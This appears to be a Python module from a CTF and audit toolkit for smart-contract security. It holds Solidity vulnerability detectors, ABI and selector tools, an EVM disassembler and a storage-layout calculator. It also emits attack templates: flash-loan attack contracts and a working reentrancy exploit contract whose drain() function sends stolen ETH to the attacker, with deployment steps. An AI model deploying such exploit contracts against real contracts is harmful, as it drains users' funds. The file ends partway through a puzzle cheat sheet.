# -*- coding: utf-8 -*-
"""区块链安全模块

覆盖：Solidity 漏洞检测、ABI 编解码、EVM 字节码反汇编、攻击模板、速查表。
适用于 CTF 区块链题目和智能合约安全审计。
"""

import hashlib
import re
from typing import Dict, Tuple

from ctftool.core.i18n import t

# ===================== EVM 操作码表 =====================

EVM_OPCODES: Dict[int, Tuple[str, int]] = {
    # (助记符, 额外读取字节数)
    # Stop & Arithmetic
    0x00: ("STOP", 0),
    0x01: ("ADD", 0),
    0x02: ("MUL", 0),
    0x03: ("SUB", 0),
    0x04: ("DIV", 0),
    0x05: ("SDIV", 0),
    0x06: ("MOD", 0),
    0x07: ("SMOD", 0),
    0x08: ("ADDMOD", 0),
    0x09: ("MULMOD", 0),
    0x0A: ("EXP", 0),
    0x0B: ("SIGNEXTEND", 0),
    # Comparison & Bitwise Logic
    0x10: ("LT", 0),
    0x11: ("GT", 0),
    0x12: ("SLT", 0),
    0x13: ("SGT", 0),
    0x14: ("EQ", 0),
    0x15: ("ISZERO", 0),
    0x16: ("AND", 0),
    0x17: ("OR", 0),
    0x18: ("XOR", 0),
    0x19: ("NOT", 0),
    0x1A: ("BYTE", 0),
    0x1B: ("SHL", 0),
    0x1C: ("SHR", 0),
    0x1D: ("SAR", 0),
    # SHA3
    0x20: ("SHA3", 0),
    # Environmental Information
    0x30: ("ADDRESS", 0),
    0x31: ("BALANCE", 0),
    0x32: ("ORIGIN", 0),
    0x33: ("CALLER", 0),
    0x34: ("CALLVALUE", 0),
    0x35: ("CALLDATALOAD", 0),
    0x36: ("CALLDATASIZE", 0),
    0x37: ("CALLDATACOPY", 0),
    0x38: ("CODESIZE", 0),
    0x39: ("CODECOPY", 0),
    0x3A: ("GASPRICE", 0),
    0x3B: ("EXTCODESIZE", 0),
    0x3C: ("EXTCODECOPY", 0),
    0x3D: ("RETURNDATASIZE", 0),
    0x3E: ("RETURNDATACOPY", 0),
    0x3F: ("EXTCODEHASH", 0),
    # Block Information
    0x40: ("BLOCKHASH", 0),
    0x41: ("COINBASE", 0),
    0x42: ("TIMESTAMP", 0),
    0x43: ("NUMBER", 0),
    0x44: ("DIFFICULTY", 0),
    0x45: ("GASLIMIT", 0),
    0x46: ("CHAINID", 0),
    0x47: ("SELFBALANCE", 0),
    0x48: ("BASEFEE", 0),
    # Stack, Memory, Storage, Flow
    0x50: ("POP", 0),
    0x51: ("MLOAD", 0),
    0x52: ("MSTORE", 0),
    0x53: ("MSTORE8", 0),
    0x54: ("SLOAD", 0),
    0x55: ("SSTORE", 0),
    0x56: ("JUMP", 0),
    0x57: ("JUMPI", 0),
    0x58: ("PC", 0),
    0x59: ("MSIZE", 0),
    0x5A: ("GAS", 0),
    0x5B: ("JUMPDEST", 0),
    # PUSH1 - PUSH32 (0x60 - 0x7F)
    **{0x60 + i: (f"PUSH{i + 1}", i + 1) for i in range(32)},
    # DUP1 - DUP16 (0x80 - 0x8F)
    **{0x80 + i: (f"DUP{i + 1}", 0) for i in range(16)},
    # SWAP1 - SWAP16 (0x90 - 0x9F)
    **{0x90 + i: (f"SWAP{i + 1}", 0) for i in range(16)},
    # LOG0 - LOG4 (0xA0 - 0xA4)
    0xA0: ("LOG0", 0),
    0xA1: ("LOG1", 0),
    0xA2: ("LOG2", 0),
    0xA3: ("LOG3", 0),
    0xA4: ("LOG4", 0),
    # System Operations
    0xF0: ("CREATE", 0),
    0xF1: ("CALL", 0),
    0xF2: ("CALLCODE", 0),
    0xF3: ("RETURN", 0),
    0xF4: ("DELEGATECALL", 0),
    0xF5: ("CREATE2", 0),
    0xFA: ("STATICCALL", 0),
    0xFD: ("REVERT", 0),
    0xFE: ("INVALID", 0),
    0xFF: ("SELFDESTRUCT", 0),
}

# ===================== 常见函数选择器表 =====================

COMMON_SELECTORS: Dict[str, str] = {
    # ERC20
    "0xa9059cbb": "transfer(address,uint256)",
    "0x095ea7b3": "approve(address,uint256)",
    "0x70a08231": "balanceOf(address)",
    "0x18160ddd": "totalSupply()",
    "0x23b872dd": "transferFrom(address,address,uint256)",
    "0xdd62ed3e": "allowance(address,address)",
    "0x313ce567": "decimals()",
    "0x06fdde03": "name()",
    "0x95d89b41": "symbol()",
    "0x40c10f19": "mint(address,uint256)",
    "0x42966c68": "burn(uint256)",
    "0x79cc6790": "burnFrom(address,uint256)",
    # ERC721
    "0x6352211e": "ownerOf(uint256)",
    "0x42842e0e": "safeTransferFrom(address,address,uint256)",
    "0xb88d4fde": "safeTransferFrom(address,address,uint256,bytes)",
    "0x081812fc": "getApproved(uint256)",
    "0xa22cb465": "setApprovalForAll(address,bool)",
    "0xe985e9c5": "isApprovedForAll(address,address)",
    "0x01ffc9a7": "supportsInterface(bytes4)",
    "0xc87b56dd": "tokenURI(uint256)",
    # Common
    "0x8da5cb5b": "owner()",
    "0x715018a6": "renounceOwnership()",
    "0xf2fde38b": "transferOwnership(address)",
    "0x3ccfd60b": "withdraw()",
    "0xd0e30db0": "deposit()",
    "0x150b7a02": "onERC721Received(address,address,uint256,bytes)",
    "0x8129fc1c": "initialize()",
    "0x2e1a7d4d": "withdraw(uint256)",
    "0xe8e33700": "addLiquidity(address,address,uint256,uint256,uint256,uint256,address,uint256)",
    "0x38ed1739": "swapExactTokensForTokens(uint256,uint256,address[],address,uint256)",
    "0x022c0d9f": "swap(uint256,uint256,address,bytes)",
    "0x0902f1ac": "getReserves()",
    "0xc45a0155": "factory()",
}

# 反向映射：签名 -> 选择器
SIGNATURE_TO_SELECTOR: Dict[str, str] = {v: k for k, v in COMMON_SELECTORS.items()}


class BlockchainModule:
    """区块链安全工具集"""

    # ================================================================
    # 漏洞检测 (6 个)
    # ================================================================

    def analyze_contract(self, source: str) -> str:
        """综合分析 Solidity 源码，检测所有已知漏洞模式"""
        lines = []
        lines.append(f"=== {t('bc.analyze_title')} ===")
        lines.append("")

        detectors = [
            (t('bc.reentrancy'), self.detect_reentrancy),
            (t('bc.integer_overflow'), self.detect_integer_overflow),
            (t('bc.tx_origin'), self.detect_tx_origin),
            (t('bc.selfdestruct'), self.detect_selfdestruct),
            (t('bc.unchecked_call'), self.detect_unchecked_call),
        ]

        total_issues = 0
        for name, detector in detectors:
            result = detector(source)
            # 统计 [!] 出现次数作为发现的问题数
            issues = result.count("[!]")
            total_issues += issues
            lines.append(result)
            lines.append("")

        lines.append(f"=== {t('bc.summary')} ===")
        if total_issues == 0:
            lines.append(f"[+] {t('bc.no_issues')}")
        else:
            lines.append(f"[!] {t('bc.found_issues')}: {total_issues}")
        return "\n".join(lines)

    def detect_reentrancy(self, source: str) -> str:
        """检测重入漏洞"""
        lines = []
        lines.append(f"--- {t('bc.reentrancy')} ---")

        has_guard = bool(re.search(
            r'(nonReentrant|ReentrancyGuard|mutex|locked\s*=\s*true)',
            source
        ))

        patterns = [
            (r'\.call\{value:', t('bc.reentrancy_call_value')),
            (r'\.call\.value\(', t('bc.reentrancy_call_value_legacy')),
            (r'delegatecall\(', t('bc.reentrancy_delegatecall')),
        ]

        found = False
        for i, src_line in enumerate(source.splitlines(), 1):
            stripped = src_line.strip()
            if stripped.startswith("//") or stripped.startswith("*"):
                continue
            for pattern, desc in patterns:
                if re.search(pattern, src_line):
                    found = True
                    if has_guard:
                        lines.append(f"[*] L{i}: {desc} ({t('bc.guard_present')})")
                    else:
                        lines.append(f"[!] L{i}: {desc} ({t('bc.no_guard')})")

        # 检查状态变更在外部调用之后（Checks-Effects-Interactions 违规）
        call_line = None
        for i, src_line in enumerate(source.splitlines(), 1):
            stripped = src_line.strip()
            if stripped.startswith("//") or stripped.startswith("*"):
                continue
            if re.search(r'\.(call|send|transfer)\s*[\({]', src_line):
                call_line = i
            elif call_line is not None and re.search(
                r'(balances\[|balance\[|_balances\[).*(\-=|\+=|=)', src_line
            ):
                lines.append(
                    f"[!] L{i}: {t('bc.state_after_call')} (L{call_line})"
                )
                found = True
                call_line = None

        if not found:
            lines.append(f"[+] {t('bc.not_found')}")
        return "\n".join(lines)

    def detect_integer_overflow(self, source: str) -> str:
        """检测整数溢出"""
        lines = []
        lines.append(f"--- {t('bc.integer_overflow')} ---")

        has_safemath = bool(re.search(
            r'(using\s+SafeMath|import.*SafeMath)', source
        ))

        # Solidity >=0.8.0 默认有溢出检查
        version_match = re.search(r'pragma\s+solidity\s*[\^>=]*\s*(\d+\.\d+\.\d+)', source)
        sol_version = version_match.group(1) if version_match else None
        has_builtin_check = False
        if sol_version:
            parts = sol_version.split('.')
            if int(parts[0]) > 0 or (int(parts[0]) == 0 and int(parts[1]) >= 8):
                has_builtin_check = True

        # 检测 unchecked 块中的算术运算
        in_unchecked = 0
        found = False
        for i, src_line in enumerate(source.splitlines(), 1):
            stripped = src_line.strip()
            if stripped.startswith("//") or stripped.startswith("*"):
                continue
            if 'unchecked' in stripped and '{' in stripped:
                in_unchecked += 1
            if in_unchecked > 0:
                if re.search(r'[\+\-\*]', stripped) and not stripped.startswith("//"):
                    lines.append(
                        f"[!] L{i}: {t('bc.overflow_unchecked')}: {stripped[:80]}"
                    )
                    found = True
                if '}' in stripped:
                    in_unchecked -= 1
                continue

            # 旧版本无 SafeMath 的算术运算
            if not has_builtin_check and not has_safemath:
                # 排除 for 循环中的 i++ 等
                if re.search(r'(for\s*\(|i\+\+|i\-\-|\+\+i|\-\-i)', stripped):
                    continue
                # 排除纯类型声明行
                if re.search(r'^\s*(uint|int|mapping|address|bool|string|bytes)\d*\s', stripped):
                    continue
                # 检测复合赋值运算符 +=, -=, *=
                if re.search(r'[\+\-\*]=', stripped):
                    lines.append(
                        f"[!] L{i}: {t('bc.overflow_no_safemath')}: {stripped[:80]}"
                    )
                    found = True
                # 检测普通算术表达式 a = b + c
                elif re.search(r'=\s*\w+\s*[\+\-\*]\s*\w+', stripped):
                    lines.append(
                        f"[!] L{i}: {t('bc.overflow_no_safemath')}: {stripped[:80]}"
                    )
                    found = True

        if has_builtin_check:
            lines.append(f"[*] {t('bc.sol_08_check')}: {sol_version}")
        if has_safemath:
            lines.append(f"[*] {t('bc.has_safemath')}")
        if not found:
            lines.append(f"[+] {t('bc.not_found')}")
        return "\n".join(lines)

    def detect_tx_origin(self, source: str) -> str:
        """检测 tx.origin 用于身份验证"""
        lines = []
        lines.append(f"--- {t('bc.tx_origin')} ---")

        found = False
        for i, src_line in enumerate(source.splitlines(), 1):
            stripped = src_line.strip()
            if stripped.startswith("//") or stripped.startswith("*"):
                continue
            if re.search(r'tx\.origin', src_line):
                if re.search(r'(require|if|assert)\s*\(.*tx\.origin', src_line):
                    lines.append(
                        f"[!] L{i}: {t('bc.tx_origin_auth')}: {stripped[:80]}"
                    )
                    found = True
                elif re.search(r'==\s*tx\.origin|tx\.origin\s*==', src_line):
                    lines.append(
                        f"[!] L{i}: {t('bc.tx_origin_compare')}: {stripped[:80]}"
                    )
                    found = True
                else:
                    lines.append(
                        f"[*] L{i}: {t('bc.tx_origin_usage')}: {stripped[:80]}"
                    )

        if not found:
            lines.append(f"[+] {t('bc.not_found')}")
        return "\n".join(lines)

    def detect_selfdestruct(self, source: str) -> str:
        """检测 selfdestruct/suicide 权限控制不当"""
        lines = []
        lines.append(f"--- {t('bc.selfdestruct')} ---")

        found = False
        for i, src_line in enumerate(source.splitlines(), 1):
            stripped = src_line.strip()
            if stripped.startswith("//") or stripped.startswith("*"):
                continue
            if re.search(r'\b(selfdestruct|suicide)\s*\(', src_line):
                # 向上搜索最近的函数，检查是否有权限控制
                func_lines = source.splitlines()[:i]
                has_access_control = False
                for j in range(len(func_lines) - 1, max(len(func_lines) - 20, -1), -1):
                    check_line = func_lines[j]
                    if re.search(
                        r'(onlyOwner|msg\.sender\s*==\s*owner|require\s*\(\s*msg\.sender|modifier)',
                        check_line
                    ):
                        has_access_control = True
                        break
                    if re.search(r'function\s+\w+', check_line):
                        break

                found = True
                if has_access_control:
                    lines.append(
                        f"[*] L{i}: {t('bc.selfdestruct_guarded')}: {stripped[:80]}"
                    )
                else:
                    lines.append(
                        f"[!] L{i}: {t('bc.selfdestruct_unguarded')}: {stripped[:80]}"
                    )

        if not found:
            lines.append(f"[+] {t('bc.not_found')}")
        return "\n".join(lines)

    def detect_unchecked_call(self, source: str) -> str:
        """检测外部调用返回值未检查"""
        lines = []
        lines.append(f"--- {t('bc.unchecked_call')} ---")

        found = False
        src_lines = source.splitlines()
        for i, src_line in enumerate(src_lines, 1):
            stripped = src_line.strip()
            if stripped.startswith("//") or stripped.startswith("*"):
                continue

            # .call( 模式
            if re.search(r'\.call\s*[\({]', src_line):
                # 检查返回值是否被使用
                if re.search(r'\(\s*bool\s+\w+\s*,', src_line) or \
                   re.search(r'require\s*\(.*\.call', src_line) or \
                   re.search(r'if\s*\(.*\.call', src_line):
                    continue
                # 检查下一行是否有 require
                next_line = src_lines[i] if i < len(src_lines) else ""
                if re.search(r'require\s*\(', next_line):
                    continue
                lines.append(
                    f"[!] L{i}: {t('bc.unchecked_call_found')}: {stripped[:80]}"
                )
                found = True

            # .send( 模式
            if re.search(r'\.send\(', src_line):
                if re.search(r'(require|if|assert)\s*\(.*\.send\(', src_line):
                    continue
                if re.search(r'bool\s+\w+\s*=.*\.send\(', src_line):
                    # 变量捕获了返回值，检查是否被使用
                    lines.append(
                        f"[*] L{i}: {t('bc.send_check_var')}: {stripped[:80]}"
                    )
                    continue
                lines.append(
                    f"[!] L{i}: {t('bc.unchecked_send')}: {stripped[:80]}"
                )
                found = True

            # .transfer 是安全的（自动 revert），仅提示
            if re.search(r'\.transfer\(', src_line):
                lines.append(
                    f"[*] L{i}: {t('bc.transfer_safe')}: {stripped[:80]}"
                )

        if not found:
            lines.append(f"[+] {t('bc.not_found')}")
        return "\n".join(lines)

    # ================================================================
    # ABI 工具 (3 个)
    # ================================================================

    def abi_decode(self, data: str) -> str:
        """ABI 编码数据解码：解析函数选择器 + 参数"""
        lines = []
        lines.append(f"=== {t('bc.abi_decode_title')} ===")

        data = data.strip()
        if data.startswith("0x") or data.startswith("0X"):
            data = data[2:]

        if len(data) < 8:
            return f"[-] {t('bc.abi_too_short')}"

        selector = "0x" + data[:8].lower()
        params_hex = data[8:]

        lines.append(f"{t('bc.selector')}: {selector}")

        # 查表
        if selector in COMMON_SELECTORS:
            lines.append(f"{t('bc.function')}: {COMMON_SELECTORS[selector]}")
        else:
            lines.append(f"{t('bc.function')}: {t('bc.unknown')}")

        # 按 32 字节分段
        if params_hex:
            lines.append(f"\n{t('bc.params')}:")
            param_idx = 0
            for offset in range(0, len(params_hex), 64):
                chunk = params_hex[offset:offset + 64]
                if not chunk:
                    break
                padded = chunk.ljust(64, '0')
                # 尝试解释为不同类型
                interpretations = []
                # uint256
                try:
                    val = int(padded, 16)
                    interpretations.append(f"uint256 = {val}")
                    if val != 0:
                        interpretations.append(f"hex = 0x{padded.lstrip('0') or '0'}")
                except ValueError:
                    pass
                # address (取后 20 字节)
                if padded[:24] == '0' * 24:
                    addr = "0x" + padded[24:]
                    interpretations.append(f"address = {addr}")
                # bytes32
                try:
                    text = bytes.fromhex(padded).rstrip(b'\x00').decode('utf-8', errors='ignore')
                    if text and all(32 <= ord(c) < 127 for c in text):
                        interpretations.append(f"string = \"{text}\"")
                except Exception:
                    pass

                lines.append(f"  [{param_idx}] 0x{chunk}")
                for interp in interpretations:
                    lines.append(f"       -> {interp}")
                param_idx += 1
        else:
            lines.append(f"{t('bc.no_params')}")

        return "\n".join(lines)

    def abi_encode(self, signature: str) -> str:
        """ABI 编码：输入函数签名 + 参数值，输出完整 calldata

        格式: "transfer(address,uint256) 0x1234...abcd 100"
        或仅函数签名: "transfer(address,uint256)"
        """
        lines = []
        lines.append(f"=== {t('bc.abi_encode_title')} ===")

        parts = signature.strip().split(None, 1)
        if not parts:
            return f"[-] {t('bc.invalid_signature')}"
        func_sig = parts[0]
        args_str = parts[1] if len(parts) > 1 else ""

        # 计算 selector
        selector = self._compute_selector(func_sig)
        lines.append(f"{t('bc.function')}: {func_sig}")
        lines.append(f"{t('bc.selector')}: {selector}")

        # 解析参数类型
        match = re.match(r'\w+\(([^)]*)\)', func_sig)
        if not match:
            return f"[-] {t('bc.invalid_signature')}"

        param_types_str = match.group(1).strip()
        param_types = [p.strip() for p in param_types_str.split(',') if p.strip()] if param_types_str else []

        # 解析参数值
        arg_values = args_str.split() if args_str else []

        if len(arg_values) != len(param_types):
            lines.append(f"\n{t('bc.selector_only')}: {selector}")
            if param_types:
                lines.append(f"{t('bc.expected_params')}: {', '.join(param_types)}")
            return "\n".join(lines)

        # 编码参数
        encoded_params = []
        for ptype, val in zip(param_types, arg_values):
            encoded_params.append(self._abi_encode_param(ptype, val))

        calldata = selector[2:] + "".join(encoded_params)
        lines.append(f"\n{t('bc.calldata')}:")
        lines.append(f"0x{calldata}")
        lines.append(f"\n{t('bc.breakdown')}:")
        lines.append(f"  {selector[2:]}  <- {t('bc.selector')}")
        for i, (ptype, param) in enumerate(zip(param_types, encoded_params)):
            lines.append(f"  {param}  <- [{i}] {ptype}")

        return "\n".join(lines)

    def selector_lookup(self, selector: str) -> str:
        """函数选择器计算/反查"""
        lines = []
        lines.append(f"=== {t('bc.selector_lookup_title')} ===")

        selector = selector.strip()

        # 判断是选择器还是函数签名
        if re.match(r'^0x[0-9a-fA-F]{8}$', selector):
            # 输入是选择器，反查
            sel_lower = selector.lower()
            if sel_lower in COMMON_SELECTORS:
                lines.append(f"{t('bc.selector')}: {sel_lower}")
                lines.append(f"{t('bc.function')}: {COMMON_SELECTORS[sel_lower]}")
            else:
                lines.append(f"{t('bc.selector')}: {sel_lower}")
                lines.append(f"{t('bc.function')}: {t('bc.not_in_db')}")
                lines.append(f"\n[*] {t('bc.selector_hint')}")
        elif re.match(r'^[0-9a-fA-F]{8}$', selector):
            sel_lower = "0x" + selector.lower()
            if sel_lower in COMMON_SELECTORS:
                lines.append(f"{t('bc.selector')}: {sel_lower}")
                lines.append(f"{t('bc.function')}: {COMMON_SELECTORS[sel_lower]}")
            else:
                lines.append(f"{t('bc.selector')}: {sel_lower}")
                lines.append(f"{t('bc.function')}: {t('bc.not_in_db')}")
        elif '(' in selector:
            # 输入是函数签名，计算选择器
            computed = self._compute_selector(selector)
            lines.append(f"{t('bc.function')}: {selector}")
            lines.append(f"{t('bc.selector')}: {computed}")
        else:
            # 模糊搜索
            lines.append(f"{t('bc.search')}: {selector}")
            matches = []
            for sel, sig in COMMON_SELECTORS.items():
                if selector.lower() in sig.lower():
                    matches.append(f"  {sel}  {sig}")
            if matches:
                lines.extend(matches)
            else:
                lines.append(f"[-] {t('bc.no_match')}")

        return "\n".join(lines)

    # ================================================================
    # 字节码分析 (2 个)
    # ================================================================

    def disasm_bytecode(self, bytecode: str) -> str:
        """EVM 字节码反汇编"""
        lines = []
        lines.append(f"=== {t('bc.disasm_title')} ===")

        bytecode = bytecode.strip()
        if bytecode.startswith("0x") or bytecode.startswith("0X"):
            bytecode = bytecode[2:]

        # 验证十六进制
        try:
            raw = bytes.fromhex(bytecode)
        except ValueError:
            return f"[-] {t('bc.invalid_hex')}"

        lines.append(f"{t('bc.bytecode_len')}: {len(raw)} bytes")
        lines.append("")

        i = 0
        while i < len(raw):
            opcode = raw[i]
            if opcode in EVM_OPCODES:
                name, extra_bytes = EVM_OPCODES[opcode]
                if extra_bytes > 0 and i + extra_bytes < len(raw):
                    operand = raw[i + 1:i + 1 + extra_bytes]
                    hex_operand = "0x" + operand.hex()
                    lines.append(f"  {i:04x}: {name} {hex_operand}")
                    i += 1 + extra_bytes
                elif extra_bytes > 0:
                    # 不完整的 PUSH 指令
                    remaining = raw[i + 1:]
                    hex_operand = "0x" + remaining.hex() if remaining else ""
                    lines.append(f"  {i:04x}: {name} {hex_operand} (truncated)")
                    break
                else:
                    lines.append(f"  {i:04x}: {name}")
                    i += 1
            else:
                lines.append(f"  {i:04x}: UNKNOWN(0x{opcode:02x})")
                i += 1

        return "\n".join(lines)

    def storage_layout_helper(self, input: str) -> str:
        """存储布局辅助：输入变量声明列表，计算 storage slot 和 offset

        输入格式（每行一个变量声明）:
            uint256 balance
            address owner
            bool paused
            uint8 decimals
            mapping(address => uint256) balances
            uint256[10] rewards
        """
        lines = []
        lines.append(f"=== {t('bc.storage_title')} ===")

        # 类型大小映射 (bytes)
        type_sizes = {
            'bool': 1,
            'uint8': 1, 'int8': 1,
            'uint16': 2, 'int16': 2,
            'uint32': 4, 'int32': 4,
            'uint64': 8, 'int64': 8,
            'uint128': 16, 'int128': 16,
            'uint256': 32, 'int256': 32,
            'uint': 32, 'int': 32,
            'address': 20,
            'bytes1': 1, 'bytes2': 2, 'bytes3': 3, 'bytes4': 4,
            'bytes8': 8, 'bytes16': 16, 'bytes20': 20, 'bytes32': 32,
        }

        slot = 0
        offset = 0  # 当前 slot 内的字节偏移
        decls = input.strip().splitlines()

        for decl in decls:
            decl = decl.strip()
            if not decl or decl.startswith("//"):
                continue

            # 去掉末尾分号和可见性修饰符
            decl = re.sub(r';\s*$', '', decl)
            decl = re.sub(r'\b(public|private|internal|external|constant|immutable)\b', '', decl).strip()

            # 解析 mapping
            if decl.startswith("mapping"):
                if offset > 0:
                    slot += 1
                    offset = 0
                var_name = decl.rsplit(None, 1)[-1] if ' ' in decl else decl
                lines.append(
                    f"  slot {slot}: {var_name} ({t('bc.mapping_slot')})"
                )
                lines.append(f"         {t('bc.mapping_hint')}")
                slot += 1
                continue

            # 解析动态数组 (type[] name)
            dyn_match = re.match(r'(\w+)\[\]\s+(\w+)', decl)
            if dyn_match:
                if offset > 0:
                    slot += 1
                    offset = 0
                var_name = dyn_match.group(2)
                lines.append(
                    f"  slot {slot}: {var_name} ({t('bc.dynarray_slot')})"
                )
                lines.append(f"         {t('bc.dynarray_hint')}")
                slot += 1
                continue

            # 解析定长数组 (type[N] name)
            arr_match = re.match(r'(\w+)\[(\d+)\]\s+(\w+)', decl)
            if arr_match:
                if offset > 0:
                    slot += 1
                    offset = 0
                base_type = arr_match.group(1)
                arr_len = int(arr_match.group(2))
                var_name = arr_match.group(3)
                elem_size = type_sizes.get(base_type, 32)
                # 计算需要多少 slot
                total_bytes = elem_size * arr_len
                num_slots = (total_bytes + 31) // 32
                lines.append(
                    f"  slot {slot}-{slot + num_slots - 1}: {var_name} "
                    f"({base_type}[{arr_len}], {num_slots} slots)"
                )
                slot += num_slots
                continue

            # 解析 string/bytes（动态类型）
            str_match = re.match(r'(string|bytes)\s+(\w+)', decl)
            if str_match:
                if offset > 0:
                    slot += 1
                    offset = 0
                var_name = str_match.group(2)
                lines.append(
                    f"  slot {slot}: {var_name} ({t('bc.dynamic_slot')})"
                )
                slot += 1
                continue

            # 解析普通类型
            parts = decl.split()
            if len(parts) >= 2:
                var_type = parts[0]
                var_name = parts[-1]
                size = type_sizes.get(var_type, 32)

                if size == 32 or offset + size > 32:
                    # 需要新 slot
                    if offset > 0:
                        slot += 1
                    offset = 0
                    lines.append(
                        f"  slot {slot}, offset {offset}: {var_name} ({var_type}, {size} bytes)"
                    )
                    if size == 32:
                        slot += 1
                        offset = 0
                    else:
                        offset += size
                else:
                    # 可以打包到当前 slot
                    lines.append(
                        f"  slot {slot}, offset {offset}: {var_name} ({var_type}, {size} bytes)"
                    )
                    offset += size
            else:
                lines.append(f"  [?] {t('bc.unknown_decl')}: {decl}")

        lines.append("")
        total_slots = slot + (1 if offset > 0 else 0)
        lines.append(f"{t('bc.total_slots')}: {total_slots}")
        return "\n".join(lines)

    # ================================================================
    # 攻击模板 (3 个)
    # ================================================================

    def flashloan_template(self, input: str = "") -> str:
        """闪电贷攻击 Solidity 模板"""
        lines = []
        lines.append(f"=== {t('bc.flashloan_title')} ===")
        lines.append("")
        lines.append(f"// {t('bc.flashloan_desc')}")
        lines.append("")

        # Aave V3
        lines.append("// ========== Aave V3 Flash Loan ==========")
        lines.append("""
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IPoolAddressesProvider {
    function getPool() external view returns (address);
}

interface IPool {
    function flashLoanSimple(
        address receiverAddress,
        address asset,
        uint256 amount,
        bytes calldata params,
        uint16 referralCode
    ) external;
}

interface IERC20 {
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}

contract AaveV3FlashLoan {
    IPool public immutable POOL;
    address public owner;

    constructor(address _poolProvider) {
        POOL = IPool(IPoolAddressesProvider(_poolProvider).getPool());
        owner = msg.sender;
    }

    function attack(address token, uint256 amount) external {
        require(msg.sender == owner, "not owner");
        POOL.flashLoanSimple(address(this), token, amount, "", 0);
    }

    function executeOperation(
        address asset,
        uint256 amount,
        uint256 premium,
        address initiator,
        bytes calldata params
    ) external returns (bool) {
        require(msg.sender == address(POOL), "not pool");
        require(initiator == address(this), "not initiator");

        // ========== YOUR EXPLOIT LOGIC HERE ==========
        // IERC20(asset).transfer(target, amount);
        // ITarget(target).vulnerableFunction();
        // ... profit ...
        // ==============================================

        // Repay flash loan + premium
        uint256 amountOwed = amount + premium;
        IERC20(asset).approve(address(POOL), amountOwed);
        return true;
    }

    function withdraw(address token) external {
        require(msg.sender == owner, "not owner");
        IERC20(token).transfer(owner, IERC20(token).balanceOf(address(this)));
    }
}""")
        lines.append("")

        # Uniswap V2 Flash Swap
        lines.append("// ========== Uniswap V2 Flash Swap ==========")
        lines.append("""
interface IUniswapV2Pair {
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
    function token0() external view returns (address);
    function token1() external view returns (address);
}

interface IUniswapV2Factory {
    function getPair(address tokenA, address tokenB) external view returns (address);
}

contract UniV2FlashSwap {
    address public owner;
    IUniswapV2Factory public factory;

    constructor(address _factory) {
        owner = msg.sender;
        factory = IUniswapV2Factory(_factory);
    }

    function attack(address token0, address token1, uint256 amount) external {
        require(msg.sender == owner, "not owner");
        address pair = factory.getPair(token0, token1);
        require(pair != address(0), "pair not found");

        // amount0Out or amount1Out > 0 triggers flash swap
        IUniswapV2Pair(pair).swap(amount, 0, address(this), abi.encode("flash"));
    }

    // Called by Uniswap V2 Pair
    function uniswapV2Call(
        address sender,
        uint amount0,
        uint amount1,
        bytes calldata data
    ) external {
        // ========== YOUR EXPLOIT LOGIC HERE ==========
        // ...
        // ==============================================

        // Repay: amount + 0.3% fee
        address token = IUniswapV2Pair(msg.sender).token0();
        uint256 repayAmount = amount0 + (amount0 * 3 / 997) + 1;
        IERC20(token).transfer(msg.sender, repayAmount);
    }
}""")

        return "\n".join(lines)

    def reentrancy_exploit_template(self, input: str = "") -> str:
        """重入攻击 exploit 合约模板"""
        lines = []
        lines.append(f"=== {t('bc.reentrancy_template_title')} ===")
        lines.append("")
        lines.append(f"// {t('bc.reentrancy_template_desc')}")
        lines.append("""
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// Vulnerable contract interface
interface IVulnerable {
    function deposit() external payable;
    function withdraw() external;
    function withdraw(uint256 amount) external;
    function balanceOf(address) external view returns (uint256);
}

contract ReentrancyExploit {
    IVulnerable public target;
    address public owner;
    uint256 public attackCount;
    uint256 public maxAttacks;

    constructor(address _target) {
        target = IVulnerable(_target);
        owner = msg.sender;
        maxAttacks = 10; // Prevent infinite loop / out-of-gas
    }

    // Step 1: Deposit some ETH to the vulnerable contract
    function deposit() external payable {
        require(msg.sender == owner, "not owner");
        target.deposit{value: msg.value}();
    }

    // Step 2: Trigger the exploit
    function attack() external {
        require(msg.sender == owner, "not owner");
        attackCount = 0;
        target.withdraw();
    }

    // Step 2b: Attack with specific amount
    function attackWithAmount(uint256 amount) external {
        require(msg.sender == owner, "not owner");
        attackCount = 0;
        target.withdraw(amount);
    }

    // Re-entrancy hook: called when target sends ETH
    receive() external payable {
        if (attackCount < maxAttacks && address(target).balance >= msg.value) {
            attackCount++;
            target.withdraw();
        }
    }

    // Fallback for contracts using .call with data
    fallback() external payable {
        if (attackCount < maxAttacks && address(target).balance >= msg.value) {
            attackCount++;
            target.withdraw();
        }
    }

    // Step 3: Drain stolen funds
    function drain() external {
        require(msg.sender == owner, "not owner");
        (bool success,) = owner.call{value: address(this).balance}("");
        require(success, "transfer failed");
    }

    function setMaxAttacks(uint256 _max) external {
        require(msg.sender == owner, "not owner");
        maxAttacks = _max;
    }

    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
}

/*
  Usage (Foundry / Hardhat):
  --------------------------
  1. Deploy: ReentrancyExploit(targetAddress)
  2. Deposit: exploit.deposit{value: 1 ether}()
  3. Attack:  exploit.attack()
  4. Drain:   exploit.drain()

  Key Points:
  - The vulnerable contract sends ETH before updating state
  - receive()/fallback() re-enters withdraw() before balance is set to 0
  - Always test with a small amount first
  - Adjust maxAttacks based on gas limit
*/""")

        return "\n".join(lines)

    def evm_puzzle_helper(self, input: str = "") -> str:
        """EVM Puzzles 解题辅助"""
        lines = []
        lines.append(f"=== {t('bc.evm_puzzle_title')} ===")
        lines.append("")

        # 常见操作码速查
        lines.append(f"[1] {t('bc.evm_stack_ops')}:")
        lines.append("  PUSH1 0xNN  - Push 1 byte onto stack")
        lines.append("  POP         - Remove top stack item")
        lines.append("  DUP1        - Duplicate top stack item")
        lines.append("  SWAP1       - Swap top 2 stack items")
        lines.append("")

        lines.append(f"[2] {t('bc.evm_arith_ops')}:")
        lines.append("  ADD         - a + b")
        lines.append("  SUB         - a - b (top - second)")
        lines.append("  MUL         - a * b")
        lines.append("  DIV         - a / b")
        lines.append("  MOD         - a % b")
        lines.append("  EXP         - a ** b")
        lines.append("  ADDMOD      - (a + b) % N")
        lines.append("  MULMOD      - (a * b) % N")
        lines.append("")

        lines.append(f"[3] {t('bc.evm_compare_ops')}:")
        lines.append("  LT          - 1 if a < b else 0")
        lines.append("  GT          - 1 if a > b else 0")
        lines.append("  EQ          - 1 if a == b else 0")
